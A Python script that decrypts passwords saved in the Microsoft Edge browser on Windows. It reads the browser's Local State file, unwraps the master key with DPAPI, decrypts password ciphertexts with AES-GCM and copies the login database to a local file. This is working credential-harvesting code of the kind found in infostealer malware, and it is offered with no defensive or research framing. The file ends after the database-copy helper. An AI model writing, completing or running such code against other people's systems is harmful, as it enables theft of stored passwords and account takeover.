# Necessary Imports
import os
import json
import base64
import shutil
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES

# Global Variables
EDGE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data"%(os.environ['USERPROFILE']))

def get_edge_secret_key():
    """
    Retrieves the secret key used by Edge browser.

    Returns:
        bytes: The secret key used by the browser, or None if it cannot be found.
    """
    try:
        # Read Edge local state file
        with open(EDGE_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        
        # Extract the encrypted key and decode it
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        # Remove the suffix "DPAPI"
        decrypted_key = encrypted_key[5:]
        
        # Decrypt the secret key using CryptUnprotectData
        secret_key = win32crypt.CryptUnprotectData(decrypted_key, None, None, None, 0)[1]

        return secret_key
    
    except Exception as e:
        print("Error: %s" % str(e))
        print("Error: Edge secret key could not be found.")

        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    """
    Decrypts a password ciphertext using the provided secret key.

    Args:
        ciphertext (bytes): The password ciphertext to decrypt.
        secret_key (bytes): The secret key used for decryption.

    Returns:
        str: The decrypted password, or an empty string if decryption fails.
    """
    try:
        # Initialization vector for AES decryption
        initialization_vector = ciphertext[3:15]

        # Get encrypted password by removing suffix bytes (last 16 bits)
        # Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]

        # Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialization_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()

        return decrypted_pass
    
    except Exception as e:
        print("Error: %s" % str(e))
        print("Error: Unable to decrypt the password. Edge version <80 is not supported. Please check.")
        return ""

    
def get_db_connection(edge_login_db_path):
    """
    Copies the edge login database file to a local location and establishes a connection to it.

    Args:
        edge_login_db_path (str): The path to the edge login database file.

    Returns:
        sqlite3.Connection: The connection object to the copied database file, or None if the database cannot be found.
    """
    try:
        shutil.copy2(edge_login_db_path, "passwords.db")

        return sqlite3.connect("passwords.db")
    
    except Exception as e:
        print("Error: %s" % str(e))
        print("Error: edge database cannot be found.")

        return None